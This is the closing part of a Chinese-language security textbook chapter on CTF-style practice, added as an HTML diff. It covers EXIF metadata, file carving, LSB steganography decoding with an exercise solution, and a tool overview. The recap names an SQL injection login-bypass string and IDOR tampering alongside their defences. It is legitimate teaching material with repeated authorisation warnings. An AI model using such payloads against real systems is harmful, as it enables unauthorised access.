+        你用手機拍的每一張照片,相機/手機都會默默把一堆資訊塞進檔案的 EXIF 區段:<strong>拍攝時間、相機型號、
+        鏡頭參數,甚至——GPS 經緯度座標</strong>。也就是說,一張隨手分享的照片,可能精準地洩漏了「你<strong>在什麼時間、什麼地點</strong>拍的」。
+        鑑識調查靠它定位嫌疑人;但反過來,一般人不小心分享原圖,也可能因此暴露住家位置。這是隱私的一大破口(呼應第 41 章)。
+      </p>
+      <p>
+        讀 EXIF 最方便的工具是 <strong><code>exiftool</code></strong>,一行就把所有 metadata 攤開:
+      </p>
+      <pre><code class="language-bash"># exiftool:讀出照片的全部 metadata(時間、相機、GPS...)
+exiftool photo.jpg
+
+# 只看有沒有 GPS 座標(洩漏拍攝地點)
+exiftool photo.jpg | grep -i gps</code></pre>
+      <p>
+        EXIF 本身格式繁複,手刻解析較費工(實務直接用 <code>exiftool</code> 或 Python 的 <code>Pillow</code> / <code>exifread</code> 套件),
+        但你可以先用最樸素的方法「聞到」它的存在——EXIF 區段裡常有可讀的字串(相機廠牌、軟體名),用前面 strings 的技巧就能瞥見:
+      </p>
+      <pre><code class="language-python"># 用 Pillow 讀 EXIF(若已安裝);這裡示範取出 GPS 與拍攝時間
+from PIL import Image
+from PIL.ExifTags import TAGS
+
+img = Image.open("photo.jpg")
+exif = img._getexif() or {}
+for tag_id, value in exif.items():
+    name = TAGS.get(tag_id, tag_id)
+    if name in ("DateTimeOriginal", "Make", "Model", "GPSInfo"):
+        print(f"{name:18}: {value}")</code></pre>
+      <div class="callout tip">
+        <div class="ico">💡</div>
+        <div class="body">
+          <span class="c-title">兩面刃:鑑識的線索,也是隱私的破口</span>
+          <p>metadata 是典型的雙面刃。對<strong>鑑識</strong>而言,EXIF 的時間與 GPS 是還原「何時、何地」的黃金證據;
+          對<strong>隱私</strong>而言,它是不小心就會洩漏行蹤的地雷。實務上:多數社群平台上傳照片時會<strong>自動清掉 EXIF</strong>,
+          但你用原檔(email 附件、雲端連結、檔案傳輸)分享時通常<em>不會</em>。
+          想保護隱私,分享前可用 <code>exiftool -all= photo.jpg</code> 把 metadata 清乾淨。</p>
+        </div>
+      </div>
+
+      <h2>檔案鑑識(三):carving 與 LSB 隱寫</h2>
+      <p>
+        最後兩招,是檔案鑑識最有「魔術感」的部分:把「藏在檔案裡的另一個檔案/訊息」挖出來。
+      </p>
+
+      <h3>檔案 carving:從一個檔案裡「雕」出另一個</h3>
+      <p>
+        <strong>檔案 carving(雕取)</strong>的概念是:很多檔案格式有明確的「<strong>結束標記</strong>」,
+        例如 PNG 一定以 <code>IEND</code> 區塊結尾、JPEG 以 <code>FF D9</code> 結尾。如果一個 PNG 在 <code>IEND</code> 之後<strong>還有資料</strong>,
+        那後面那串東西,十之八九是<strong>偷偷夾帶</strong>進去的(因為正常的圖片檢視器讀到 <code>IEND</code> 就停了,根本不會理會後面)。
+        我們就「順著結構,把該結束的地方之後的東西雕出來」:
+      </p>
+      <pre><code class="language-python"># 從 PNG 的 IEND 結束標記「之後」雕出被夾帶的資料
+png = open("photo.png", "rb").read()
+i = png.index(b"IEND")              # 找到 PNG 應該結束的地方
+appended = png[i + 8:]             # 跳過 'IEND'(4 byte) + CRC(4 byte)
+print("IEND 之後夾帶的資料(前 64 byte):", appended[:64])
+
+import re
+m = re.search(rb"FLAG\{[^}]*\}", appended)
+print("雕出來的旗 :", m.group(0).decode() if m else "(沒找到)")</code></pre>
+      <p>
+        這正是業界工具 <strong><code>binwalk</code></strong> 在做的事(只是它更強):它會掃過整個檔案,
+        辨認出裡面<strong>所有</strong>嵌入的檔案簽章(一個 firmware 韌體裡常包著好幾個壓縮檔、檔案系統、圖片),然後幫你<strong>自動把它們全部分離出來</strong>:
+      </p>
+      <pre><code class="language-bash">binwalk firmware.bin        # 掃描:列出裡面藏了哪些檔案
+binwalk -e firmware.bin     # extract:把藏在裡面的檔案通通雕出來</code></pre>
+
+      <h3>LSB 隱寫術:把訊息藏進圖片的最低位元</h3>
+      <p>
+        carving 是「把檔案接在檔案後面」,藏得還算明顯。<strong>隱寫術(steganography)</strong>則高明得多——
+        它把祕密藏進<strong>看起來毫無異樣的圖片「像素裡」</strong>,肉眼完全看不出來。最經典的手法叫
+        <strong>LSB(Least Significant Bit,最低有效位元)隱寫</strong>。
+      </p>
+      <p>
+        原理優雅得令人會心一笑:一個像素的顏色值是 0–255 的數字(8 個 bit)。把它的<strong>最低位的那一個 bit</strong>
+        改掉,顏色頂多變動 1(例如 200 → 201)——人眼<strong>根本分辨不出</strong>這點差異。於是,我們就把祕密訊息的每一個 bit,
+        偷偷塞進一個個像素的最低位元裡。一張圖有幾十萬個像素,藏個幾百字綽綽有餘,而圖片看起來毫髮無傷:
+      </p>
+
+      <div class="diagram">
+<svg viewBox="0 0 720 210" xmlns="http://www.w3.org/2000/svg" font-family="Inter, 'Noto Sans TC', sans-serif">
+  <text x="360" y="24" text-anchor="middle" font-size="13" font-weight="800" fill="#1f2328">LSB 隱寫:改最低位元,人眼看不出</text>
+  <text x="60" y="58" font-size="12" font-weight="700" fill="#4a5159">某像素原本的值 200 :</text>
+  <g font-family="monospace" font-size="15">
+    <rect x="320" y="42" width="34" height="26" fill="#e3efed" stroke="#2f6f6a"/><text x="337" y="61" text-anchor="middle">1</text>
+    <rect x="354" y="42" width="34" height="26" fill="#e3efed" stroke="#2f6f6a"/><text x="371" y="61" text-anchor="middle">1</text>
+    <rect x="388" y="42" width="34" height="26" fill="#e3efed" stroke="#2f6f6a"/><text x="405" y="61" text-anchor="middle">0</text>
+    <rect x="422" y="42" width="34" height="26" fill="#e3efed" stroke="#2f6f6a"/><text x="439" y="61" text-anchor="middle">0</text>
+    <rect x="456" y="42" width="34" height="26" fill="#e3efed" stroke="#2f6f6a"/><text x="473" y="61" text-anchor="middle">1</text>
+    <rect x="490" y="42" width="34" height="26" fill="#e3efed" stroke="#2f6f6a"/><text x="507" y="61" text-anchor="middle">0</text>
+    <rect x="524" y="42" width="34" height="26" fill="#e3efed" stroke="#2f6f6a"/><text x="541" y="61" text-anchor="middle">0</text>
+    <rect x="558" y="42" width="34" height="26" fill="#fdece5" stroke="#b4541f" stroke-width="2"/><text x="575" y="61" text-anchor="middle" fill="#b4541f">0</text>
+  </g>
+  <text x="60" y="118" font-size="12" font-weight="700" fill="#4a5159">藏入祕密 bit「1」後 201 :</text>
+  <g font-family="monospace" font-size="15">
+    <rect x="320" y="102" width="34" height="26" fill="#e3efed" stroke="#2f6f6a"/><text x="337" y="121" text-anchor="middle">1</text>
+    <rect x="354" y="102" width="34" height="26" fill="#e3efed" stroke="#2f6f6a"/><text x="371" y="121" text-anchor="middle">1</text>
+    <rect x="388" y="102" width="34" height="26" fill="#e3efed" stroke="#2f6f6a"/><text x="405" y="121" text-anchor="middle">0</text>
+    <rect x="422" y="102" width="34" height="26" fill="#e3efed" stroke="#2f6f6a"/><text x="439" y="121" text-anchor="middle">0</text>
+    <rect x="456" y="102" width="34" height="26" fill="#e3efed" stroke="#2f6f6a"/><text x="473" y="121" text-anchor="middle">1</text>
+    <rect x="490" y="102" width="34" height="26" fill="#e3efed" stroke="#2f6f6a"/><text x="507" y="121" text-anchor="middle">0</text>
+    <rect x="524" y="102" width="34" height="26" fill="#e3efed" stroke="#2f6f6a"/><text x="541" y="121" text-anchor="middle">0</text>
+    <rect x="558" y="102" width="34" height="26" fill="#fdece5" stroke="#b4541f" stroke-width="2"/><text x="575" y="121" text-anchor="middle" fill="#b4541f">1</text>
+  </g>
+  <text x="575" y="150" text-anchor="middle" font-size="10.5" fill="#b4541f">↑ 只改了最低位元</text>
+  <text x="360" y="184" text-anchor="middle" font-size="11.5" fill="#1f2328">200 → 201,顏色只差 1/256,肉眼無感;但每個像素都藏 1 個 bit,湊起來就是一段訊息</text>
+</svg>
+        <figcaption>圖 71-6:LSB 隱寫術。把訊息的每個 bit 藏進像素的最低位元,顏色僅變動 ±1,人眼看不出,但程式可以一個 bit 一個 bit 把它讀回來、拼成原訊息。</figcaption>
+      </div>
+
+      <p>
+        既然藏進去是「取每個像素的最低位、湊成訊息」,那<strong>解碼</strong>就是反過來:把每個像素的最低位元取出來,
+        每 8 個拼成一個 byte,串成原本的訊息。我們用最單純的 BMP(像素資料從第 54 byte 開始,沒有壓縮)來示範,純標準庫:
+      </p>
+      <pre><code class="language-python">def lsb_decode(bmp):
+    pixels = bmp[54:]            # BMP 的像素資料從第 54 byte 開始
+    out = bytearray()
+    cur = 0
+    for i, p in enumerate(pixels):
+        cur = (cur &lt;&lt; 1) | (p &amp; 1)    # 取這個 byte 的最低位元,MSB first 拼回
+        if i % 8 == 7:                 # 每湊滿 8 個 bit = 1 個 byte
+            if cur == 0:               # 用 0 當訊息結束符
+                break
+            out.append(cur)
+            cur = 0
+    return out.decode("ascii", "replace")
+
+bmp = open("secret.bmp", "rb").read()
+print("從像素最低位元解出的訊息 :", lsb_decode(bmp))   # 例如 FLAG{...}</code></pre>
+      <p>
+        看懂這段程式,你就掌握了隱寫術的鑰匙。<code>(cur &lt;&lt; 1) | (p &amp; 1)</code> 這一行是精華:
+        <code>p &amp; 1</code> 取出像素的最低位元,<code>cur &lt;&lt; 1</code> 把已收集的 bits 往左挪一格騰出位置,再用 <code>|</code> 把新 bit 補進來——
+        這正是「一個 bit 一個 bit 把 byte 組回來」的標準寫法。
+      </p>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 71.7 <span class="badge">挑戰</span></div>
+        <div class="ex-body">
+          <p>(a) 用上面的 <code>lsb_decode()</code>,把藏在 <code>secret.bmp</code> 像素最低位元裡的旗標解出來。
+          (b) 想一想:如果隱寫者不是用「最低 1 個 bit」,而是用「最低 2 個 bits」來藏訊息,你的解碼程式要怎麼改?
+          (c) 為什麼 LSB 隱寫<strong>不適合</strong>直接用在 JPEG 這種「有失真壓縮」的格式上?</p>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <pre><code class="language-python"># (a) 解出旗標
+def lsb_decode(bmp, nbits=1):       # (b) 順手支援「每像素取 nbits 個位元」
+    pixels = bmp[54:]
+    out = bytearray()
+    cur, got = 0, 0
+    mask = (1 &lt;&lt; nbits) - 1         # nbits=1→0b1, nbits=2→0b11
+    for p in pixels:
+        cur = (cur &lt;&lt; nbits) | (p &amp; mask)   # 一次取低 nbits 位
+        got += nbits
+        while got &gt;= 8:            # 每湊滿 8 位元就吐一個 byte
+            got -= 8
+            byte = (cur &gt;&gt; got) &amp; 0xff
+            if byte == 0:
+                return out.decode("ascii", "replace")
+            out.append(byte)
+    return out.decode("ascii", "replace")
+
+bmp = open("secret.bmp", "rb").read()
+print("旗標 :", lsb_decode(bmp, nbits=1))</code></pre>
+              <p><strong>(b)</strong> 把「每像素取 1 個 bit」改成「取 <code>nbits</code> 個 bit」:用遮罩 <code>mask = (1 &lt;&lt; nbits) - 1</code> 取低位,
+              並改成「累積到滿 8 位元就吐一個 byte」的通用作法(如上)。用 2 個 bit 藏,容量加倍,但對畫質的影響也變大(顏色最多差 3)。</p>
+              <p><strong>(c)</strong> 因為 <strong>JPEG 是失真壓縮</strong>:它會為了縮小檔案,把人眼不敏感的細節<em>丟掉並重算</em>像素值。
+              而 LSB 隱寫的訊息恰恰藏在「人眼不敏感的最低位元」——JPEG 壓縮一過,這些最低位元就被改得面目全非,藏的訊息直接被毀掉。
+              所以 LSB 隱寫適合用在 <strong>BMP、PNG 這類無損(lossless)</strong>格式上。(針對 JPEG 有專門的隱寫法,藏在 DCT 係數而非原始像素,屬於進階主題。)</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>實戰工具速覽</h2>
+      <p>
+        這一章我們刻意「手刻」了很多東西——那是為了把底層原理練進骨子裡。但真實工作與比賽中,你會大量倚賴成熟工具。
+        把它們各記住一句話,知道「什麼時候該抓哪一把」:
+      </p>
+      <div class="table-wrap">
+      <table>
+        <thead><tr><th>工具</th><th>領域</th><th>一句話:它幫你做什麼</th></tr></thead>
+        <tbody>
+          <tr><td><code>file</code></td><td>檔案</td><td>用魔術位元組判斷檔案<strong>真實類型</strong>,無視造假的副檔名。</td></tr>
+          <tr><td><code>strings</code></td><td>檔案</td><td>把檔案裡所有<strong>可見字串</strong>撈出來——旗標常常就裸奔在裡面。</td></tr>
+          <tr><td><code>xxd</code></td><td>檔案</td><td>十六進位 + ASCII 並排顯示,看清<strong>每一個位元組</strong>(檢查檔頭/結構)。</td></tr>
+          <tr><td><code>binwalk</code></td><td>carving</td><td>掃描並<strong>自動分離</strong>一個檔案裡嵌入的所有檔案(韌體分析神器)。</td></tr>
+          <tr><td><code>exiftool</code></td><td>metadata</td><td>讀寫照片/檔案的 <strong>EXIF 等中繼資料</strong>(時間、相機、GPS);也能一鍵清除。</td></tr>
+          <tr><td><code>stegsolve</code></td><td>隱寫</td><td>圖形化逐<strong>位元平面(bit plane)</strong>檢視圖片,肉眼找出 LSB 等隱寫痕跡。</td></tr>
+          <tr><td><code>zsteg</code></td><td>隱寫</td><td>專門<strong>自動偵測</strong> PNG/BMP 裡的 LSB 隱寫,省去手刻解碼。</td></tr>
+          <tr><td><strong>Wireshark</strong></td><td>封包</td><td>業界標準的<strong>封包分析</strong>工具:圖形化分層、強大過濾器,讀 <code>.pcap</code> 必備。</td></tr>
+          <tr><td><strong>Burp Suite</strong> / OWASP ZAP</td><td>Web</td><td>攔截/重放/竄改 HTTP 請求的<strong>Web 攻防代理(proxy)</strong>,測 SQLi、IDOR 的利器(僅限授權)。</td></tr>
+        </tbody>
+      </table>
+      </div>
+      <div class="callout note">
+        <div class="ico">🔧</div>
+        <div class="body">
+          <span class="c-title">先會手刻,再用工具</span>
+          <p>工具讓你<strong>快</strong>,但手刻讓你<strong>懂</strong>。一個只會按 <code>binwalk -e</code> 的人,遇到工具沒認出來的客製格式就束手無策;
+          一個懂「檔案結構、結束標記、位元操作」的人,才能在工具失效時自己寫幾行 Python 解決問題。
+          這一章的價值,不在於那幾支腳本,而在於它給你的那雙<strong>能看穿位元組的眼睛</strong>——
+          有了它,任何工具到你手上都更鋒利。</p>
+        </div>
+      </div>
+
+      <h2>把這一章串起來</h2>
+      <p>
+        我們從「知道」走到了「做出」。回顧這趟動手奪旗的旅程:
+      </p>
+      <ul>
+        <li><strong>立場永遠第一</strong>:所有攻擊操作,<strong>只在本機靶機與授權環境</strong>進行,絕不碰真實系統——這是白帽與罪犯的唯一分界(第 41 章)。</li>
+        <li><strong>Web 攻防</strong>(第 52 章):偵察(看原始碼、<code>robots.txt</code>)找線索;<code>' OR '1'='1' -- </code> 靠「資料越界成指令」繞過登入,防線是<strong>參數化查詢</strong>;竄改 <code>id</code> 觸發 <strong>IDOR</strong> 越權,防線是<strong>伺服器端的擁有者/權限檢查</strong>。攻擊全程用 Python <code>requests</code> 自動化。</li>
+        <li><strong>封包分析</strong>(第 25 章):封包是<strong>分層</strong>的俄羅斯娃娃;用<strong>位移</strong>手刻解析 MAC、IP(記得用 IHL 算長度)、TCP 埠與<strong>旗標</strong>(SYN/ACK 還原三向交握);從 TLS ClientHello 的<strong>明文 SNI</strong> 看出造訪的網址(加密保護內容,但去向會曝光)。</li>
+        <li><strong>揪出中間人</strong>(第 34 章):<strong>ARP 投毒</strong>讓攻擊者坐進你和閘道之間;破案靠兩條鐵證——<strong>同一 IP 對應到兩個 MAC</strong>,且那個陌生 MAC 的<strong>本地管理位元</strong>顯示它是軟體偽造的。根本防線是 HTTPS/TLS 與交換器層的 DAI。</li>
+        <li><strong>檔案鑑識</strong>(第 53 章):<strong>魔術位元組</strong>決定檔案真實身分(不是副檔名),據此<strong>辨識與修復</strong>檔案;<strong>EXIF</strong> 是鑑識的線索也是隱私的破口;<strong>carving</strong>(順著結束標記雕出夾帶檔)與 <strong>LSB 隱寫</strong>(把訊息藏進像素最低位元)讓你挖出肉眼看不見的祕密。</li>
+        <li><strong>工具</strong>讓你快,<strong>手刻</strong>讓你懂——先懂原理,再讓 Wireshark、binwalk、Burp 在你手上發揮全力。</li>
+      </ul>
+      <p>
+        你現在握有的,不只是七支能跑的腳本,而是一種<strong>「動手把理論驗證一遍」的能力與習慣</strong>。
+        資安的世界裡,光「聽說」永遠不夠——能自己架個靶機、寫幾行程式把攻擊重現,你對防禦的理解才會從紙面長進手裡。
+        帶著這雙能看穿位元組、能拆穿封包、能識破檔案的眼睛,記得那條從不鬆手的線:<strong>只對授權的目標出手,讓技術永遠是盾。</strong>
+      </p>
+
+      <div class="callout note">
+        <div class="ico">📚</div>
+        <div class="body">
+          <span class="c-title">想更深入?延伸資源</span>
+          <p>想系統性、合法地練 Web 攻防,<a href="https://portswigger.net/web-security">PortSwigger Web Security Academy</a>
+          是公認最好的免費互動教材,每個漏洞(SQLi、IDOR、XSS……)都附<strong>自架的實驗靶場</strong>,搭配它的
+          <a href="https://portswigger.net/burp">Burp Suite</a> 練攔截與重放。想全面入門各類 CTF,
+          <a href="https://picoctf.org/">picoCTF</a>(卡內基美隆大學主辦)是最友善的起點,題目由淺到深、永遠開放練習;
+          找比賽與練習平台可上 <a href="https://ctftime.org/">CTFtime</a>。封包分析的業界標準工具是
+          <a href="https://www.wireshark.org/">Wireshark</a>(官網有大量教學與範例 <code>.pcap</code>);
+          Web 安全的防禦聖經是 <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> 與
+          <a href="https://cheatsheetseries.owasp.org/">OWASP Cheat Sheet Series</a>,想動手玩漏洞可架
+          <a href="https://owasp.org/www-project-juice-shop/">OWASP Juice Shop</a>。
+          本章對應的理論在:Web 安全<strong>第 52 章</strong>、網路<strong>第 25 章</strong>、資安基礎與 MITM<strong>第 34 章</strong>、
+          密碼學<strong>第 35 章</strong>、防禦性程式設計<strong>第 36 章</strong>、數位鑑識<strong>第 53 章</strong>、倫理與隱私<strong>第 41 章</strong>。
+          最後再叮嚀一次:<strong>所有練習都只在你擁有或獲明確授權的環境進行,絕不對真實系統出手。</strong></p>
+        </div>
+      </div>
+
+    </article>
+  </main>
+</div>
+<script src="../assets/book.js"></script>
+</body>
+</html>
